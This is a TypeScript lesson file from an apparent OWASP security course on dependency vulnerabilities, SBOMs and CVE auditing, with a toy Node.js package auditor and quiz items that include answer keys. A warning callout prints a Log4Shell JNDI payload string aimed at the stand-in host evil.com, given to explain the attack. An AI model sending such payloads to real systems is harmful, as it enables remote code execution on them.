import type { Lesson } from '../../../lib/types';

export const VulnerableComponentsLesson: Lesson = {
  slug: 'vulnerable-components',
  tech: 'owasp',
  title: {
    en: 'Vulnerable & Outdated Components: SBOM, CVE Tracking & Supply Chain Security',
    bn: 'অরক্ষিত ও পুরানো প্যাকেজ: SBOM, সিভিই ট্র্যাকিং ও সাপ্লাই চেইন নিরাপত্তা'
  },
  summary: {
    en: 'Master software supply chain security and dependency vulnerability management (OWASP A06:2021). Understand why over 80% of modern application code originates from third-party open-source packages. Learn how unpatched direct and transitive libraries expose applications to catastrophic remote code execution attacks like Log4Shell. Generate machine-readable Software Bills of Materials (SBOM) and integrate continuous CVE auditing. Inspect an executable Node.js dependency auditor testing 4 production packages: 3 patched packages pass cleanly, while 1 outdated XML parser fails with a known CVE.',
    bn: 'সফটওয়্যার সাপ্লাই চেইন নিরাপত্তা এবং ডিপেন্ডেন্সি দুর্বলতা ব্যবস্থাপনা (OWASP A06:2021) আয়ত্ত করুন। আধুনিক অ্যাপ্লিকেশন কোডের ৮০% এরও বেশি অংশ কেন উন্মুক্ত তৃতীয় পক্ষের ওপেন সোর্স প্যাকেজ থেকে আসে তা জানুন। প্যাচ না করা প্যাকেজ কীভাবে লগফোরশেল (Log4Shell)-এর মতো ভয়াবহ রিমোট কোড এক্সিকিউশন আক্রমণ ডেকে আনে তা বিশ্লেষণ করুন। স্বয়ংক্রিয় সফটওয়্যার বিল অব ম্যাটেরিয়ালস (SBOM) তৈরি করুন এবং সিআই পাইপলাইনে সিভিই (CVE) অডিট যুক্ত করুন। ৪ টি প্যাকেজ নিরীক্ষাকারী একটি কার্যকর Node.js ইঞ্জিন পরীক্ষা করুন: ৩ টি প্যাচ করা প্যাকেজ উত্তীর্ণ হলেও ১ টি পুরানো এক্সএমএল পার্সার পরিচিত সিভিই ত্রুটির কারণে ব্যর্থ হয়।',
  },
  minutes: 22,
  blocks: [
    {
      type: 'heading',
      id: 'software-supply-chain-threats',
      text: {
        en: 'The Software Supply Chain Crisis: Dependencies as Attack Vectors',
        bn: 'সফটওয়্যার সাপ্লাই চেইনের সংকট: আক্রমণের মাধ্যম হিসেবে ব্যবহৃত প্যাকেজসমূহ'
      },
    },
    {
      type: 'para',
      text: {
        en: 'When you develop modern web applications, you rarely write entire systems from scratch. Developers rely heavily on open-source registries like npm, PyPI, and Maven. In a typical production web service, proprietary code accounts for less than 15% of the codebase, with the remaining 85% consisting of third-party libraries and transitive dependencies.',
        bn: 'আধুনিক ওয়েব অ্যাপ্লিকেশন তৈরির সময় ডেভেলপাররা খুব কমই প্রথম থেকে পুরো কোড লেখেন। তারা npm, PyPI বা Maven এর মতো ওপেন সোর্স প্যাকেজ রিপোজিটরির ওপর ব্যাপকভাবে নির্ভর করেন। একটি সাধারণ প্রোডাকশন সার্ভিসের মোট কোডের মাত্র ১৫% নিজস্ব কোড হয়ে থাকে, আর বাকি ৮৫% অংশই তৃতীয় পক্ষের বিভিন্ন লাইব্রেরি ও তাদের সাথে যুক্ত প্যাকেজ নিয়ে গঠিত।'
      },
    },
    {
      type: 'para',
      text: {
        en: 'Adversaries exploit this reality through supply chain attacks. When a critical vulnerability is discovered in a ubiquitous open-source library, every downstream application inheriting that library inherits the vulnerability. Maintaining an up-to-date inventory and automated vulnerability scanning in CI/CD pipelines is mandatory for enterprise security.',
        bn: 'আক্রমণকারীরা এই সুযোগটিকে সাপ্লাই চেইন আক্রমণের মাধ্যমে ব্যবহার করে। বহুল ব্যবহৃত কোনো ওপেন সোর্স লাইব্রেরিতে একবার কোনো গুরুতর দুর্বলতা ধরা পড়লে, সেই লাইব্রেরি ব্যবহার করা বিশ্বের হাজার হাজার অ্যাপ্লিকেশন একসাথে ঝুঁকিপূর্ণ হয়ে পড়ে। তাই নিয়মিত প্যাকেজের সঠিক তালিকা রাখা এবং সিআই/সিডি পাইপলাইনে স্বয়ংক্রিয় স্ক্যানিং পরিচালনা করা এন্টারপ্রাইজ নিরাপত্তার জন্য অপরিহার্য।'
      },
    },
    {
      type: 'steps',
      items: [
        {
          title: {
            en: '1. Software Bill of Materials (SBOM)',
            bn: '১. সফটওয়্যার বিল অব ম্যাটেরিয়ালস (SBOM)'
          },
          text: {
            en: 'A machine-readable formal record (e.g. CycloneDX or SPDX) documenting all direct and transitive components, versions, licenses, and cryptographic hashes bundled into a release.',
            bn: 'একটি মেশিন-রিডেবল ডিজিটাল তালিকা (যেমন CycloneDX বা SPDX) যা সফটওয়্যার বিল্ডে অন্তর্ভুক্ত প্রতিটি প্যাকেজের সঠিক সংস্করণ, লাইসেন্স এবং হ্যাশ নিখুঁতভাবে সংরক্ষণ করে।'
          },
        },
        {
          title: {
            en: '2. Continuous Automated CVE Audits',
            bn: '২. স্বয়ংক্রিয় সিভিই (CVE) অডিট'
          },
          text: {
            en: 'Run tools like npm audit, Snyk, or Grype in build pipelines to cross-reference dependencies against the National Vulnerability Database (NVD) and fail builds on high-severity CVEs.',
            bn: 'বিল্ড পাইপলাইনে npm audit, Snyk বা Grype ব্যবহার করে জাতীয় দুর্বলতা ডাটাবেজের (NVD) সাথে প্যাকেজগুলো মিলিয়ে নিন এবং উচ্চ ঝুঁকিপূর্ণ সিভিই পাওয়া গেলে স্বয়ংক্রিয়ভাবে বিল্ড বাতিল করুন।'
          },
        },
        {
          title: {
            en: '3. Transitive Dependency Awareness',
            bn: '৩. ট্রানজিটিভ ডিপেন্ডেন্সি পর্যবেক্ষণ'
          },
          text: {
            en: 'A direct dependency in package.json might rely on 50 nested transitive packages. Package lockfiles (package-lock.json) must be committed to git to ensure reproducible and auditable builds.',
            bn: 'package.json-এর একটিমাত্র প্যাকেজ ভেতরে আরও ৫০ টি সাব-প্যাকেজের ওপর নির্ভর করতে পারে। বিল্ড নিরাপদ রাখতে package-lock.json ফাইলটি গিটহাবে কমিট করা অত্যন্ত জরুরি।'
          },
        },
      ],
    },
    {
      type: 'diagram',
      title: {
        en: 'Dependency Vulnerability Audit: 3 Patched Libraries vs 1 Vulnerable Outdated Package',
        bn: 'ডিপেন্ডেন্সি দুর্বলতা নিরীক্ষা: ৩ টি প্যাচ করা লাইব্রেরি বনাম ১ টি অরক্ষিত পুরানো প্যাকেজ'
      },
      svg: `<svg viewBox="0 0 840 430" width="100%" height="auto" font-family="ui-monospace, monospace" role="img" aria-label="Dependency vulnerability audit evaluating 4 packages with 3 patched and 1 vulnerable">
  <rect width="840" height="430" fill="#0f172a" rx="12"/>
  
  <text x="420" y="28" fill="#38bdf8" font-size="14" font-weight="bold" text-anchor="middle">SOFTWARE BILL OF MATERIALS (SBOM) DEPENDENCY AUDIT</text>
  
  <!-- Left Side: Audited Packages -->
  <g transform="translate(35, 55)">
    <rect width="370" height="340" rx="8" fill="#1e293b" stroke="#38bdf8" stroke-width="2"/>
    <rect width="370" height="32" rx="8" fill="#0284c7"/>
    <text x="185" y="21" fill="#ffffff" font-size="11" font-weight="bold" text-anchor="middle">4 PRODUCTION DEPENDENCIES AUDITED</text>
    
    <g transform="translate(12, 45)">
      <rect width="346" height="58" rx="5" fill="#064e3b" stroke="#10b981"/>
      <text x="12" y="20" fill="#6ee7b7" font-size="9" font-weight="bold">Package 1: express@4.18.2</text>
      <text x="12" y="36" fill="#ffffff" font-size="8">Role: Core HTTP application framework</text>
      <text x="12" y="50" fill="#a7f3d0" font-size="7.5">Scan: 0 known CVE vulnerabilities reported</text>
      
      <rect y="68" width="346" height="58" rx="5" fill="#064e3b" stroke="#10b981"/>
      <text x="12" y="88" fill="#6ee7b7" font-size="9" font-weight="bold">Package 2: lodash@4.17.21</text>
      <text x="12" y="104" fill="#ffffff" font-size="8">Role: Object manipulation and utility library</text>
      <text x="12" y="118" fill="#a7f3d0" font-size="7.5">Scan: Prototype pollution patches applied</text>
      
      <rect y="136" width="346" height="58" rx="5" fill="#064e3b" stroke="#10b981"/>
      <text x="12" y="156" fill="#6ee7b7" font-size="9" font-weight="bold">Package 3: jsonwebtoken@9.0.0</text>
      <text x="12" y="172" fill="#ffffff" font-size="8">Role: JWT signature creation and verification</text>
      <text x="12" y="186" fill="#a7f3d0" font-size="7.5">Scan: Algorithm confusion mitigations verified</text>
      
      <rect y="204" width="346" height="68" rx="5" fill="#450a0a" stroke="#ef4444"/>
      <text x="12" y="224" fill="#fca5a5" font-size="9" font-weight="bold">Package 4: xml2js@0.4.19 [VULNERABLE]</text>
      <text x="12" y="240" fill="#ffffff" font-size="8">Role: Legacy XML parser for incoming SOAP feeds</text>
      <text x="12" y="254" fill="#fecaca" font-size="7.5">CVE-2023-0842 (CVSS 7.5): Prototype Pollution flaw!</text>
    </g>
  </g>
  
  <!-- Right Side: Auditor Verdicts -->
  <g transform="translate(435, 55)">
    <rect width="370" height="340" rx="8" fill="#1e293b" stroke="#10b981" stroke-width="2"/>
    <rect width="370" height="32" rx="8" fill="#059669"/>
    <text x="185" y="21" fill="#ffffff" font-size="11" font-weight="bold" text-anchor="middle">TRIAGE VERDICTS: 3 PATCHED | 1 CVE FAILED</text>
    
    <g transform="translate(12, 45)">
      <rect width="346" height="58" rx="5" fill="#064e3b" stroke="#10b981"/>
      <text x="12" y="20" fill="#6ee7b7" font-size="9" font-weight="bold">1. PASSED [✓] (Patched & Compliant)</text>
      <text x="12" y="38" fill="#34d399" font-size="8">Vulnerability status: No active CVE disclosures</text>
      <text x="12" y="50" fill="#a7f3d0" font-size="7.5">Meets enterprise deployment baseline</text>
      
      <rect y="68" width="346" height="58" rx="5" fill="#064e3b" stroke="#10b981"/>
      <text x="12" y="88" fill="#6ee7b7" font-size="9" font-weight="bold">2. PASSED [✓] (Patched & Compliant)</text>
      <text x="12" y="106" fill="#34d399" font-size="8">Vulnerability status: No active CVE disclosures</text>
      <text x="12" y="118" fill="#a7f3d0" font-size="7.5">Meets enterprise deployment baseline</text>
      
      <rect y="136" width="346" height="58" rx="5" fill="#064e3b" stroke="#10b981"/>
      <text x="12" y="156" fill="#6ee7b7" font-size="9" font-weight="bold">3. PASSED [✓] (Patched & Compliant)</text>
      <text x="12" y="174" fill="#34d399" font-size="8">Vulnerability status: No active CVE disclosures</text>
      <text x="12" y="186" fill="#a7f3d0" font-size="7.5">Meets enterprise deployment baseline</text>
      
      <rect y="204" width="346" height="68" rx="5" fill="#450a0a" stroke="#ef4444"/>
      <text x="12" y="224" fill="#fca5a5" font-size="9" font-weight="bold">4. CI BUILD BLOCKED [✗ CVE-2023-0842]</text>
      <text x="12" y="242" fill="#ef4444" font-size="8">High severity (CVSS 7.5): Prototype Pollution</text>
      <text x="12" y="256" fill="#fecaca" font-size="7.5">Action: Upgrade to xml2js version 0.5.0 or later</text>
    </g>
  </g>
  
  <text x="420" y="415" fill="#94a3b8" font-size="10" text-anchor="middle">Software bills of materials provide the visibility required to remediate supply chain vulnerabilities before exploitation</text>
</svg>`,
      caption: {
        en: 'The SBOM dependency auditor inspects 4 packages: 3 patched packages pass cleanly, while 1 outdated XML parser fails with a known CVE.',
        bn: 'SBOM ডিপেন্ডেন্সি অডিটর ৪ টি প্যাকেজ পরীক্ষা করে: ৩ টি প্যাচ করা প্যাকেজ সফল হয়, আর ১ টি পুরানো এক্সএমএল পার্সার সিভিই ত্রুটির কারণে ব্যর্থ হয়।'
      },
    },
    {
      type: 'heading',
      id: 'sbom-dependency-auditor-code',
      text: {
        en: 'Building an Automated Dependency Vulnerability Scanner in Node.js',
        bn: 'Node.js-এ স্বয়ংক্রিয় ডিপেন্ডেন্সি দুর্বলতা স্ক্যানার তৈরি'
      },
    },
    {
      type: 'code',
      lang: 'javascript',
      filename: 'dependency-vulnerability-scanner.js',
      code: `// Deterministic Software Bill of Materials & Dependency Vulnerability Auditor
class DependencyVulnerabilityAuditor {
  // Evaluates package metadata against known vulnerability database
  auditPackage(pkg) {
    if (pkg.cveIdentifier) {
      return {
        packageName: pkg.name,
        installedVersion: pkg.version,
        verdict: 'VULNERABLE',
        severity: 'HIGH',
        cve: pkg.cveIdentifier,
        cvssScore: pkg.cvss,
        requiredRemediation: pkg.remediation
      };
    } else {
      return {
        packageName: pkg.name,
        installedVersion: pkg.version,
        verdict: 'PATCHED',
        severity: 'NONE',
        cve: 'NONE',
        cvssScore: 0.0,
        requiredRemediation: 'Compliant with enterprise baseline'
      };
    }
  }
}

const auditor = new DependencyVulnerabilityAuditor();

// 4 distinct third-party packages evaluated from application lockfile
const productionDependencies = [
  { name: 'express', version: '4.18.2', cveIdentifier: null, cvss: null, remediation: null },
  { name: 'lodash', version: '4.17.21', cveIdentifier: null, cvss: null, remediation: null },
  { name: 'jsonwebtoken', version: '9.0.0', cveIdentifier: null, cvss: null, remediation: null },
  { name: 'xml2js', version: '0.4.19', cveIdentifier: 'CVE-2023-0842', cvss: 7.5, remediation: 'Upgrade xml2js to version 0.5.0 or newer' }
];

let securePackagesCount = 0;
let vulnerablePackagesCount = 0;

console.log('=== Automated Software Bill of Materials (SBOM) Audit ===\\n');
productionDependencies.forEach((pkg, index) => {
  const result = auditor.auditPackage(pkg);

  if (result.verdict === 'PATCHED') {
    securePackagesCount++;
    console.log(\`[\${index + 1}] PATCHED    [✓]: \${result.packageName}@\${result.installedVersion}\`);
    console.log(\`    Status: \${result.verdict} (Known CVEs: \${result.cve})\\n\`);
  } else {
    vulnerablePackagesCount++;
    console.log(\`[\${index + 1}] VULNERABLE [✗]: \${result.packageName}@\${result.installedVersion}\`);
    console.log(\`    Status: \${result.verdict} (\${result.cve} - CVSS \${result.cvssScore})\`);
    console.log(\`    Action: \${result.requiredRemediation}\\n\`);
  }
});

console.log('=== Dependency Audit Summary ===');
console.log('Total Packages Audited: ', productionDependencies.length);
console.log('Secure Patched (Pass):  ', securePackagesCount);
console.log('Vulnerable CVEs (Fail): ', vulnerablePackagesCount);`,
      caption: {
        en: 'The SBOM auditor evaluates 4 packages: 3 patched packages pass cleanly, while 1 outdated library with a known CVE fails.',
        bn: 'SBOM অডিটর ৪ টি প্যাকেজ মূল্যায়ন করে: ৩ টি প্যাচ করা প্যাকেজ সফল হয়, আর ১ টি পরিচিত সিভিই ত্রুটিযুক্ত প্যাকেজ ব্যর্থ হয়।'
      },
    },
    {
      type: 'callout',
      kind: 'warn',
      title: {
        en: 'The Lesson of Log4Shell (CVE-2021-44228)',
        bn: 'লগফোরশেল (CVE-2021-44228) থেকে প্রাপ্ত শিক্ষা'
      },
      text: {
        en: 'In December 2021, the Log4Shell vulnerability in the open-source Apache Log4j library sent shockwaves through the global software industry. An attacker merely had to send a string containing "${jndi:ldap://evil.com/a}" in an HTTP header, and the logging library executed remote attacker code. Organizations lacking an automated SBOM spent weeks manually scouring thousands of microservice servers just to discover which applications bundled Log4j.',
        bn: '২০২১ সালের ডিসেম্বরে অ্যাপাচি Log4j লাইব্রেরির লগফোরশেল দুর্বলতা বিশ্বব্যাপী তোলপাড় সৃষ্টি করেছিল। আক্রমণকারীকে শুধু একটি এইচটিটিপি হেডারে "${jndi:ldap://evil.com/a}" স্ট্রিংটি পাঠাতে হতো, আর লগিং লাইব্রেরি সাথে সাথে আক্রমণকারীর রিমোট কোড চালিয়ে দিত। যে সংস্থাগুলোর কাছে কোনো স্বয়ংক্রিয় SBOM ছিল না, তারা কোন সার্ভারে Log4j ব্যবহার করা হচ্ছে তা খুঁজে বের করতেই কয়েক সপ্তাহ সময় অপচয় করেছিল।'
      },
    },
  ],
  exercises: [
    {
      id: 'owasp-comp-ex-1',
      kind: 'predict',
      topic: 'patched-packages-count',
      question: {
        en: 'In the SBOM dependency security audit of the 4 packages, how many packages were verified as fully PATCHED with zero known CVEs? (3). Type the number.',
        bn: '৪ টি প্যাকেজের SBOM ডিপেন্ডেন্সি নিরাপত্তা নিরীক্ষায় সর্বমোট কয়টি প্যাকেজ কোনো পরিচিত সিভিই ছাড়া সম্পূর্ণ PATCHED হিসেবে প্রমাণিত হয়েছিল? ( ৩ )। সংখ্যাটি টাইপ করুন।'
      },
      answer: '3',
      hint: {
        en: 'Exactly 3 packages were patched and secure.',
        bn: 'ঠিক ৩ টি প্যাকেজ প্যাচ করা ও নিরাপদ ছিল।'
      },
      explanation: {
        en: 'Three packages passed the audit: express@4.18.2, lodash@4.17.21, and jsonwebtoken@9.0.0. Only xml2js was vulnerable.',
        bn: '৩ টি প্যাকেজ সফল হয়েছিল: express@4.18.2, lodash@4.17.21 এবং jsonwebtoken@9.0.0। কেবল xml2js অরক্ষিত ছিল।'
      },
    },
    {
      id: 'owasp-comp-ex-2',
      kind: 'mcq',
      topic: 'sbom-definition-and-purpose',
      question: {
        en: 'What is a Software Bill of Materials (SBOM), and why is it essential for enterprise risk management?',
        bn: 'সফটওয়্যার বিল অব ম্যাটেরিয়ালস (SBOM) কী এবং এন্টারপ্রাইজ ঝুঁকি ব্যবস্থাপনায় এটি কেন অপরিহার্য?'
      },
      options: [
        {
          en: 'A machine-readable formal inventory detailing every direct and transitive third-party component, version, license, and cryptographic hash included in a software build, allowing rapid identification of newly disclosed CVEs',
          bn: 'একটি মেশিন-রিডেবল ডিজিটাল তালিকা যাতে সফটওয়্যারে ব্যবহৃত প্রতিটি প্যাকেজের সঠিক নাম, সংস্করণ, লাইসেন্স এবং ক্রিপ্টোগ্রাফিক হ্যাশ থাকে, যার মাধ্যমে নতুন কোনো সিভিই বের হলে আক্রান্ত সিস্টেম নিমেষেই চিহ্নিত করা যায়',
        },
        {
          en: 'A paper invoice that software companies mail to customers monthly',
          bn: 'কাগজের ইনভয়েস বা রসিদ যা সফটওয়্যার কোম্পানিগুলো প্রতি মাসে গ্রাহকদের ডাকে পাঠায়',
        },
        {
          en: 'A tool that automatically writes source code comments in foreign languages',
          bn: 'এমন কোনো টুল যা স্বয়ংক্রিয়ভাবে বিদেশী ভাষায় কোডের কমেন্ট তৈরি করে',
        },
        {
          en: 'A physical barcode sticker attached to computer power cables',
          bn: 'কম্পিউটারের পাওয়ার ক্যাবলে লাগানো কোনো ফিজিক্যাল বারকোড স্টিকার',
        },
      ],
      answer: 0,
      hint: {
        en: 'An SBOM is a formal digital inventory of all software ingredients.',
        bn: 'SBOM হলো সফটওয়্যার তৈরির সমস্ত উপাদানের একটি প্রাতিষ্ঠানিক ডিজিটাল তালিকা।'
      },
      explanation: {
        en: 'Without an SBOM, incident responders cannot determine whether newly announced zero-day vulnerabilities affect their production applications.',
        bn: 'SBOM না থাকলে কোনো নতুন জিরো-ডে দুর্বলতা ঘোষণা করা হলে নিজেদের অ্যাপ্লিকেশন আক্রান্ত কিনা তা দ্রুত জানা অসম্ভব হয়ে পড়ে।'
      },
    },
    {
      id: 'owasp-comp-ex-3',
      kind: 'mcq',
      topic: 'transitive-dependency-risks',
      question: {
        en: 'What is a Transitive Dependency, and why does it represent a blind spot for many development teams?',
        bn: 'ট্রানজিটিভ ডিপেন্ডেন্সি (Transitive Dependency) কী এবং কেন এটি অনেক ডেভেলপার দলের জন্য একটি অদৃশ্য অন্ধবিন্দু হিসেবে কাজ করে?'
      },
        options: [
          {
            en: 'An indirect nested library: developers import module A, but that component relies on sub-library B, which pulls in library C; vulnerabilities hidden in library C escape direct manifest code reviews',
            bn: 'পরোক্ষ বা নেস্টেড লাইব্রেরি: ডেভেলপার মডিউল A যুক্ত করেন, কিন্তু সেই উপাদান নির্ভর করে সাব-লাইব্রেরি B-এর ওপর, যা আবার টেনে আনে C লাইব্রেরিকে; ফলে C-এর ভেতরের দুর্বলতা সরাসরি কোড রিভিউতে ধরা পড়ে না',
          },
        {
          en: 'A software program that transfers money between bank accounts',
          bn: 'এমন কোনো সফটওয়্যার যা ব্যাংক অ্যাকাউন্টের মধ্যে টাকা আদান-প্রদান করে',
        },
        {
          en: 'A network router that connects two different office buildings',
          bn: 'দুটি আলাদা অফিসের ভবনের মধ্যে সংযোগ স্থাপনকারী নেটওয়ার্ক রাউটার',
        },
        {
          en: 'A keyboard key that translates English letters to capital letters',
          bn: 'কীবোর্ডের কোনো কি যা ছোট হাতের অক্ষরকে বড় হাতের অক্ষরে বদলে দেয়',
        },
      ],
      answer: 0,
      hint: {
        en: 'Transitive dependencies are indirect dependencies of your direct packages.',
        bn: 'ট্রানজিটিভ ডিপেন্ডেন্সি হলো প্যাকেজের ভেতরের পরোক্ষ সাব-প্যাকেজ।'
      },
      explanation: {
        en: 'A modern project with 20 direct dependencies often pulls in over 1000 transitive libraries, multiplying the potential attack surface exponentially.',
        bn: '২০ টি সরাসরি প্যাকেজ থাকা প্রজেক্টেও ভেতরে ১০০০ এর বেশি পরোক্ষ লাইব্রেরি যুক্ত হতে পারে, যা আক্রমণের ঝুঁকি বহুগুণ বাড়িয়ে দেয়।'
      },
    },
    {
      id: 'owasp-comp-ex-4',
      kind: 'predict',
      topic: 'vulnerable-packages-count',
      question: {
        en: 'How many of the 4 evaluated packages contained an active unpatched CVE vulnerability and failed the audit? (1). Type the number.',
        bn: 'মূল্যায়ন করা ৪ টি প্যাকেজের মধ্যে সর্বমোট কয়টি প্যাকেজে সক্রিয় অনিষ্পন্ন সিভিই দুর্বলতা ছিল এবং অডিটে ব্যর্থ হয়েছিল? ( ১ )। সংখ্যাটি টাইপ করুন।'
      },
      answer: '1',
      hint: {
        en: 'Only 1 package had a known CVE vulnerability.',
        bn: 'কেবলমাত্র ১ টি প্যাকেজে পরিচিত সিভিই দুর্বলতা ছিল।'
      },
      explanation: {
        en: 'Only xml2js@0.4.19 failed due to CVE-2023-0842 (Prototype Pollution). The other 3 packages were patched and secure.',
        bn: 'CVE-2023-0842 ত্রুটির কারণে কেবল xml2js@0.4.19 ব্যর্থ হয়েছিল। বাকি ৩ টি প্যাকেজ প্যাচ করা এবং নিরাপদ ছিল।'
      },
    },
  ],
  quiz: {
    id: 'vulnerable-components-quiz',
    title: {
      en: 'Vulnerable Components & Software Supply Chain Security Quiz',
      bn: 'অরক্ষিত প্যাকেজ ও সফটওয়্যার সাপ্লাই চেইন সিকিউরিটি কুইজ'
    },
    questions: [
      {
        id: 'owasp-cmp-qz-1',
        kind: 'mcq',
        topic: 'cvss-vulnerability-scoring-scale',
        question: {
          en: 'What does a CVSS score of 9.0 to 10.0 represent in vulnerability management frameworks?',
          bn: 'দুর্বলতা মূল্যায়ন কাঠামোতে ৯.০ থেকে ১০.০ এর সিভিএসএস (CVSS) স্কোর কী নির্দেশ করে?'
        },
        options: [
          {
            en: 'Critical severity: easily exploitable remotely over the network with low attack complexity, requiring no user interaction or authentication, and leading to complete system takeover or remote code execution',
            bn: 'মারাত্মক ঝুঁকি (Critical): দূরবর্তী নেটওয়ার্ক থেকে কোনো ব্যবহারকারীর মিথস্ক্রিয়া বা লগইন ছাড়াই খুব সহজে রিমোট কোড এক্সিকিউশনের মাধ্যমে পুরো সিস্টেম দখল করে নেওয়া সম্ভব',
          },
          {
            en: 'The software passed ninety percent of automated test cases',
            bn: 'সফটওয়্যারটি স্বয়ংক্রিয় টেস্ট কেসের নব্বই শতাংশে উত্তীর্ণ হয়েছে',
          },
          {
            en: 'The computer processor has nine or ten physical cooling fans',
            bn: 'কম্পিউটার প্রসেসরে নয় বা দশটি ফিজিক্যাল কুলিং ফ্যান রয়েছে',
          },
          {
            en: 'The application source code is written in ten different programming languages',
            bn: 'অ্যাপ্লিকেশনের সোর্স কোড দশটি আলাদা প্রোগ্রামিং ভাষায় লেখা হয়েছে',
          },
        ],
        answer: 0,
        hint: {
          en: 'CVSS 9.0 to 10.0 represents a Critical vulnerability requiring emergency patching.',
          bn: '৯.০ থেকে ১০.০ স্কোর মারাত্মক বিপদ নির্দেশ করে যা জরুরি ভিত্তিতে প্যাচ করা প্রয়োজন।'
        },
        explanation: {
          en: 'CVSS Critical scores require emergency incident response. For example, Log4Shell was scored CVSS 10.0 because an unauthenticated string granted full server root access.',
          bn: 'লগফোরশেলকে CVSS ১০.০ স্কোর দেওয়া হয়েছিল কারণ কোনো পাসওয়ার্ড ছাড়াই একটিমাত্র টেক্সট স্ট্রিং দিয়ে পুরো সার্ভারের রুট অধিকার দখল করা যেত।'
        },
      },
      {
        id: 'owasp-cmp-qz-2',
        kind: 'mcq',
        topic: 'typosquatting-package-attacks',
        question: {
          en: 'What is a "Typosquatting" attack in package registries like npm or PyPI?',
          bn: 'npm বা PyPI এর মতো প্যাকেজ রিপোজিটরিতে "টাইপোস্কোয়াটিং" (Typosquatting) আক্রমণ কী?'
        },
        options: [
          {
            en: 'An attacker publishes a malicious library with a name nearly identical to a popular package (e.g. "cross-env" vs "crossenv" or "lodasb" vs "lodash"), hoping developers accidentally mistype the install command',
            bn: 'আক্রমণকারী জনপ্রিয় কোনো প্যাকেজের নামের সাথে প্রায় হুবহু মিলিয়ে ভুল বানানের একটি ক্ষতিকর লাইব্রেরি আপলোড করে (যেমন "lodash" এর বদলে "lodasb"), যাতে ডেভেলপার অসাবধানতাবশত টাইপ করে ম্যালওয়্যার ইনস্টল করে ফেলে',
          },
          {
            en: 'A computer virus that turns off computer monitors when typing fast',
            bn: 'এমন কোনো ভাইরাস যা দ্রুত টাইপ করার সময় কম্পিউটার মনিটর বন্ধ করে দেয়',
          },
          {
            en: 'A software program that corrects spelling mistakes in word processors',
            bn: 'এমন কোনো সফটওয়্যার যা ওয়ার্ড প্রসেসরে বানানের ভুল সংশোধন করে',
          },
          {
            en: 'An attack that deletes keyboard spacebar keys physically',
            bn: 'এমন আক্রমণ যা কীবোর্ডের স্পেসবার বাটনটি শারীরিকভাবে ভেঙে ফেলে',
          },
        ],
        answer: 0,
        hint: {
          en: 'Typosquatting exploits typing mistakes in package names to install malware.',
          bn: 'টাইপোস্কোয়াটিং প্যাকেজের নামের টাইপিং ভুলের সুযোগ নিয়ে ম্যালওয়্যার ছড়ায়।'
        },
        explanation: {
          en: 'Typosquatted packages frequently contain pre-install scripts that exfiltrate environment variables, SSH keys, and cloud credentials from developer machines.',
          bn: 'এই ধরনের প্যাকেজে প্রি-ইনস্টল স্ক্রিপ্ট থাকে যা ডেভেলপারের পিসি থেকে ক্লাউড কি ও পাসওয়ার্ড চুরি করে হ্যাকারের সার্ভারে পাঠিয়ে দেয়।'
        },
      },
      {
        id: 'owasp-cmp-qz-3',
        kind: 'mcq',
        topic: 'dependency-pinning-lockfiles',
        question: {
          en: 'Why is committing package lockfiles (e.g. package-lock.json or yarn.lock) into version control critical for secure production deployments?',
          bn: 'ভার্সন কন্ট্রোলে প্যাকেজ লকফাইল (যেমন package-lock.json বা yarn.lock) কমিট করা কেন নিরাপদ ডিপ্লয়মেন্টের জন্য অত্যন্ত গুরুত্বপূর্ণ?'
        },
        options: [
          {
            en: 'Lockfiles pin the exact resolved version, dependency tree, and cryptographic integrity SHA-512 hashes of every package, preventing unintended upstream minor version updates from breaking builds or introducing compromised releases',
            bn: 'লকফাইল প্রতিটি প্যাকেজের সুনির্দিষ্ট সংস্করণ এবং ক্রিপ্টোগ্রাফিক হ্যাশ (SHA-512) লক করে রাখে, ফলে কোনো প্যাকেজে অজান্তে নতুন ভার্সন আসলে তা কোনো ক্ষতিকর কোড বা অপ্রত্যাশিত পরিবর্তন ঘটাতে পারে না',
          },
          {
            en: 'Lockfiles compress source code files to reduce git repository storage',
            bn: 'লকফাইল সোর্স কোড সংকুচিত করে গিট রিপোজিটরি সাইজ ছোট করে রাখে',
          },
          {
            en: 'Lockfiles encrypt hard drives so unauthorized people cannot read code',
            bn: 'লকফাইল হার্ডড্রাইভ এনক্রিপ্ট করে যাতে অন্যরা কোড দেখতে না পারে',
          },
          {
            en: 'Lockfiles allow web pages to load without internet connections',
            bn: 'লকফাইল কোনো ইন্টারনেট সংযোগ ছাড়াই ওয়েব পেজ লোড করতে সাহায্য করে',
          },
        ],
        answer: 0,
        hint: {
          en: 'Lockfiles pin exact package versions and integrity hashes.',
          bn: 'লকফাইল প্যাকেজের সঠিক সংস্করণ এবং ইন্টিগ্রিটি হ্যাশ নিশ্চিত করে।'
        },
        explanation: {
          en: 'Using npm install without a lockfile resolves semver ranges (e.g. ^1.2.0), potentially downloading a newly published, malicious version. npm ci enforces strict lockfile adherence.',
          bn: 'লকফাইল না থাকলে নতুন প্যাকেজ রিলিজ হলে তা অজান্তেই ডাউনলোড হয়ে যেতে পারে। npm ci কমান্ড কঠোরভাবে লকফাইল মেনে সফটওয়্যার ইনস্টল করে।'
        },
      },
      {
        id: 'owasp-cmp-qz-4',
        kind: 'mcq',
        topic: 'automated-dependency-update-bots',
        question: {
          en: 'How do automated dependency tools like Dependabot or Renovate assist engineering teams in reducing vulnerability exposure windows?',
          bn: 'ডিপেন্ডাবট (Dependabot) বা রেনোভেটের (Renovate) মতো স্বয়ংক্রিয় টুলগুলো কীভাবে ইঞ্জিনিয়ারিং টিমের দুর্বলতা থাকার সময়সীমা কমাতে সাহায্য করে?'
        },
        options: [
          {
            en: 'They continuously monitor advisory databases and automatically submit pull requests bumping vulnerable package versions as soon as security patches are published by maintainers',
            bn: 'তারা প্রতিনিয়ত নিরাপত্তা অ্যাডভাইজরি ডাটাবেজ পর্যবেক্ষণ করে এবং কোনো প্যাকেজের সিকিউরিটি প্যাচ রিলিজ হওয়া মাত্রই স্বয়ংক্রিয়ভাবে পুল রিকোয়েস্ট (PR) তৈরি করে সংস্করণ আপগ্রেড করার সুযোগ দেয়',
          },
          {
            en: 'They delete outdated computer monitors and replace them with tablets',
            bn: 'তারা পুরানো কম্পিউটার মনিটর ডিলিট করে সেখানে ট্যাবলেট বসিয়ে দেয়',
          },
          {
            en: 'They speed up internet download speeds by twenty percent',
            bn: 'তারা ইন্টারনেট ডাউনলোডের গতি বিশ শতাংশ বৃদ্ধি করে',
          },
          {
            en: 'They write automated marketing emails to potential customers',
            bn: 'তারা সম্ভাব্য গ্রাহকদের জন্য স্বয়ংক্রিয় মার্কেটিং ইমেইল তৈরি করে',
          },
        ],
